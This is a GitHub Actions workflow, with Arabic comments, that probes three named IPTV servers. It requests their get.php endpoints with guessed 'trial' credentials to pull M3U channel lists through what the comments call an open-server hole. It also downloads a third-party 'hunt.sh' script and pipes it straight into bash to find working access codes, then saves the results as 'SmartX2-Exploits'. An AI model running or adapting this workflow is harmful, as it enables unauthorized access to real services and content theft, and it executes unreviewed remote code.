name: SmartX2-Server-Prober
on:
  workflow_dispatch:
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v3

      - name: AI Server Brute-Force & Hunt
        run: |
          echo "Analyzing Old Code: 745446402722985..."
          echo "Targeting Smart X2 Infrastructure..."
          
          # 1. قائمة السيرفرات التي يعمل عليها Smart X2 و Vision
          SERVERS=(
            "http://smart-x2.com:8080"
            "http://vsn.one:8080"
            "http://vision.co.ma:8080"
          )

          # 2. البحث عن ملفات M3U مسربة أو أكواد تجريبية (Trial) من نفس السيرفر
          for server in "${SERVERS[@]}"; do
            echo "Checking Server: $server"
            # محاولة جلب باقة قنوات عامة بدون كود (ثغرة السيرفر المفتوح)
            curl -sL "$server/get.php?username=trial&password=trial&type=m3u" > trial_list.m3u || true
          done
          
          # 3. استخدام سكربت "البحث عن الأكواد الشغالة"
          curl -sL "https://raw.githubusercontent.com/tuba-iptv/tuba/main/hunt.sh" | bash || true

          echo "AI: Search finished."
        continue-on-error: true

      - name: Final Output
        uses: actions/upload-artifact@v4
        with:
          name: SmartX2-Exploits
          path: "*.m3u"
